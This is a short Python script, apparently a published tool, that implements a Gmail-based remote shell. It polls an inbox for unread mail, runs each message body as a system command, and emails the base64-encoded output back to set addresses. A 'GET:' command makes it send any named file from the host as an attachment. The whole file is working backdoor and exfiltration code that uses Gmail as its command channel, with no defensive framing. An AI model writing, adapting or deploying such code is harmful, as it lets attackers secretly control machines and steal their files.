#!/bin/env python

'''
 Simple gmail Shell written in python3 by @Riadh Benlamine.
 __version__ = 1.1
'''

import imaplib
import smtplib
import email
import subprocess
import base64
import multiprocessing
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

EMAIL_ADD = '' # Gmail of this payload
PASSWORD = '' # Password of this Gmail
EMAIL_TO = [''] # Gmails to send the output


def mail():
    ''' recive mails and return them '''
    try:
        mail = imaplib.IMAP4_SSL('imap.gmail.com')
        mail.login(EMAIL_ADD, PASSWORD)
        mail.select('inbox')
        result, data = mail.uid('search', None, 'UnSeen')
        latest_email_uid = data[0].split()[-1]
        result, data = mail.uid('fetch', latest_email_uid, '(RFC822)')
        raw_email = data[0][1]
        msg = email.message_from_bytes(raw_email)
        hdr = email.header.make_header(email.header.decode_header(msg['Subject']))
        subject = str(hdr)

        for part in msg.walk():
            body = part.get_payload(decode=True)
            if body is not None:
                break
        return body.decode()
    except:
        return 0

def send(data=None, path=None):
    ''' send email with this prams
    data: any str
    path: any file path
    '''
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADD, PASSWORD)
        if path is not None:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADD
            msg['To'] = ','.join(EMAIL_TO)
            msg['Subject'] = "Gmail-Shell Output"
            body = 'You requested file'
            msg.attach(MIMEText(body, 'plain'))
            file_name = path.split('/')[-1]
            file_content = open(path, 'rb').read()
            base = MIMEBase('application', 'octet-stream')
            base.set_payload(file_content)
            encoders.encode_base64(base)
            base.add_header('Content-Disposition', f"attachment; filename= {file_name}")
            msg.attach(base)
            text = msg.as_string()
            server.sendmail(EMAIL_ADD, EMAIL_TO, text)
        if data:
            server.sendmail(EMAIL_ADD, EMAIL_TO, str(data).encode())
    except:
        pass

def analyzer(command):
    ''' command should be str to check if there is one of methods '''
    if 'GET:' in command:
        file_path = command.replace("GET:", '')
        send(path=file_path)
    else:
        pass


def main():
    ''' Main program '''
    command = mail()
    if isinstance(command, str):
        try:
            command = command.replace('\r', '').replace('\n', '')
            analyzer(command)
            command_output = subprocess.run(command.split(" "), stdout=subprocess.PIPE).stdout.decode('utf-8')
            text = f"Output: {command_output}"
            payload = base64.b64encode(text.encode())
            send(data=payload)
        except FileNotFoundError:
            pass
    else:
        pass

if __name__ == '__main__':
    proc_one = multiprocessing.Process(target=main)
    proc_one.start()
